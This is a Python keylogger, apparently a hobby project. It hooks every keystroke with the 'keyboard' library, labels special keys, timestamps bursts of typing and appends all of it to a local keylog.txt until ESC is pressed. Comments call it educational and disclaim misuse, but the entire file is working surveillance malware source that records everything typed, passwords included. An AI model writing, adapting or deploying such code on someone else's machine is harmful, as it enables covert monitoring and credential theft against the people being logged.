import time
from datetime import datetime
import keyboard
# This is a simple keylogger that logs keystrokes to a file.
# This code is just for educational pruposes as well as to test my skills as a programmer.
# DO NOT USE THIS CODE FOR MALICIOUS PURPOSES. I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS CODE. USE IT AT YOUR OWN RISK.


# Now this is the Configuration.

log_file = "keylog.txt"
keys = []
last_key_time = time.time()
running = True

# This function writes the logged keys to a file.


def write_to_file():
    """Write captured keys to log file"""
    global keys
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write("".join(keys))
        keys = []  # Cleaing  the array  after writing
    except Exception as e:
        print(f"Error writing to file: {e}")


def on_key_press(event):
    """Callback function when a key is pressed"""
    global keys, last_key_time
    key = event.name
    #  this is for handling special keys
    if key == "space":
        key = " "
    elif key == "enter":
        key = "\n"
    elif key == "tab":
        key = "\t"
    elif key == "backspace":
        key = "[BACKSPACE]"
    elif len(key) > 1:  #  so for other special keys like  the ctrl, shift and others
        key = f"[{key.upper()}]"

    # Add timestamp for first key after a pause
    if not keys or time.time() - last_key_time > 5:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        keys.append(f"\n[{timestamp}] ")

    keys.append(key)
    last_key_time = time.time()

    # Write to file every 50 keystrokes
    if len(keys) % 50 == 0:
        write_to_file()


def start_keylogger():
    """This starts capturing keystrokes"""
    global last_key_time

    print("=" * 50)
    print("KEYLOGGER - Press ESC to stop")
    print("=" * 50)

    last_key_time = time.time()

    # Register the key press handler
    keyboard.on_press(on_key_press)

    try:
        keyboard.wait("esc")  # so this waits for the  ESC key to stop
    except KeyboardInterrupt:
        pass
    finally:
        stop_keylogger()


def stop_keylogger():  # This function is for stopping the keylogger .. this us yet to be implemented
    """Stop capturing keystrokes"""
    global running
    running = False
    if keys:  # Write any remaining keys
        write_to_file()
    print(f"\nKeylogger stopped. Log saved to {log_file}")


start_keylogger()
